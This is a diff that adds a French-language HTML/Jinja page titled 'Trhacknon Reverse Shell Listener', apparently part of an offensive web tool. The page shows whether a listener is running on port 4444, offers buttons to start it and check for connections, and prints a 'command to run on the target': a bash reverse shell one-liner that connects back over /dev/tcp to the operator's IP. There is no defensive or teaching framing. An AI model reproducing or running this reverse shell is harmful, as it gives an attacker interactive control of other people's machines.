@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Trhacknon Reverse Shell Listener</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: monospace;
+            padding: 20px;
+        }
+        input, button {
+            background-color: #111;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 10px;
+            font-family: monospace;
+        }
+        .log {
+            margin-top: 20px;
+            border: 1px dashed #0f0;
+            padding: 10px;
+            white-space: pre-wrap;
+            background: #111;
+        }
+        .success {
+            color: lime;
+        }
+        .error {
+            color: red;
+        }
+        a {
+            color: #0ff;
+        }
+    </style>
+</head>
+<body>
+    <h1>Trhacknon Reverse Shell Listener</h1>
+    
+    <p>Status du listener : 
+        {% if listener_running %}
+            <span class="success">Actif sur le port 4444</span>
+        {% else %}
+            <span class="error">Inactif</span>
+        {% endif %}
+    </p>
+
+    <form method="POST">
+        <button type="submit" name="action" value="start">Démarrer le listener</button>
+        <button type="submit" name="action" value="check">Vérifier les connexions</button>
+    </form>
+
+    {% if result %}
+    <div class="log">
+        <strong>Résultat :</strong><br>
+        {{ result }}
+    </div>
+    {% endif %}
+
+    <p style="margin-top:30px;">Commande à exécuter sur la cible :</p>
+    <code>bash -i &gt;&amp; /dev/tcp/{{ your_ip }}/4444 0&gt;&amp;1</code>
+
+    <p style="margin-top:20px;">
+        <a href="https://github.com/trhacknon">By Trhacknon</a>
+    </p>
+</body>
+</html>
